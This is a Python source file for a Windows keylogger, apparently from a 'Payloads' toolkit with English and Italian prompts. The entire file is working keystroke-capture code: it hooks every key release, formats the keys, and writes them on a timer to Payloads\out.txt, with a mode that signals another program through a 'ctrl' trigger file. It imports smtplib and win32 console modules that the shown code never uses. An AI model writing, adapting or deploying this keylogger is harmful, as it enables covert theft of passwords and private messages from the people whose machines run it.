import pythoncom
import keyboard
import smtplib
import os
import shutil
import sys
from threading import Semaphore, Timer
from win32 import win32console, win32gui


class Keylogger:
    def __init__(self):
        self.get_lang_and_mode()
        self.log = ""
        self.list_ = []
        self.semaphore = Semaphore(0)

    def callback(self, event):
        name = event.name
        if self.mode == "out_for_other_app":
            self.log += name
            for i in range(len(self.log)):
                print(self.log[i])
            x = False
            j = len(self.log) - 1
            while j >= 0:
                if self.log[j] == "s":
                    i = j
                    x = True
                    break
                j -= 1
            if x:
                try:
                    if self.log[i + 1] == "c" and self.log[i + 2] == "t" and self.log[i + 3] == "r" and self.log[i + 4] == "l":
                        open(self.true_file_path, "w").write("True")
                        sys.exit()
                except Exception:
                    pass
                try:
                    if(self.log[i - 1] == "l" and self.log[i - 2] == "r" and self.log[i - 3] == "t" and self.log[i - 4] == "c"):
                        open(self.true_file_path, "w").write("True")
                        sys.exit()
                except IndexError:
                    pass
        else:
            if len(name) > 1:
                if name == "space":
                    name = " "
                elif name == "enter":
                    name = "[ENTER]\n"
                elif name == "decimal":
                    name = "."
                else:
                    name = name.replace(" ", "_")
                    name = f"[{name.upper()}]"
            print(name)
            self.log += name

    def report(self):
        if self.log:
            if "Payloads" in os.getcwd():
                out_file = "out.txt"
            else:
                out_file = "Payloads\\out.txt"
            if "out.txt" in os.listdir():
                with open(out_file, "a") as out_file:
                    out_file.write(self.log)
            else:
                with open(out_file, "w") as out_file:
                    out_file.write(self.log)
        self.log = ""
        Timer(interval=self.interval, function=self.report).start()

    def start(self):
        if self.mode == "out_for_other_app":
            self.interval = 3
        else:
            while True:
                try:
                    if self.language == "English":
                        choice = int(input("Enter the number of seconds after which to write output to a file: "))
                    else:
                        choice = int(input("Immettere il numero di secondi dopo cui scrivere l'output su un file: "))
                    continue_ = True
                except Exception:
                    if self.language == "English":
                        print("You have not entered a valid choice!")
                    else:
                        print("Non hai inserito una scelta valida!")
                    continue_ = False
                if continue_:
                    if choice >= 0 and choice <= 3600:
                        self.interval = choice
                        break
                    else:
                        if self.language == "English":
                            print("You have not entered a valid choice!")
                        else:
                            print("Non hai inserito una scelta valida!")
        keyboard.on_release(callback=self.callback)
        self.report()
        self.semaphore.acquire()

    def get_lang_and_mode(self):
        if "lang.txt" in os.listdir():
            lang_file_path = "lang.txt"
        else:
            lang_file_path = "..\\lang.txt"
        with open(lang_file_path, "r") as lang_file:
            list_ = lang_file.readlines()
            self.language = list_[0]
            lang_list = list(self.language)
            if lang_list[-1] == "\n":
                lang_list.pop()
            self.language = "".join(lang_list)
            with open(lang_file_path, "w") as lang_file:
                lang_file.write(self.language)
        try:
            if "Payloads" in os.getcwd():
                self.true_file_path = "true.txt"
            else:
                self.true_file_path = "Payloads\\true.txt"
            start_str = open(self.true_file_path, "r").read()
            if start_str == "Start":
                self.mode = "out_for_other_app"
                open(self.true_file_path, "w").write("")
            else:
                self.mode = "default"
        except Exception:
            pass


if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()
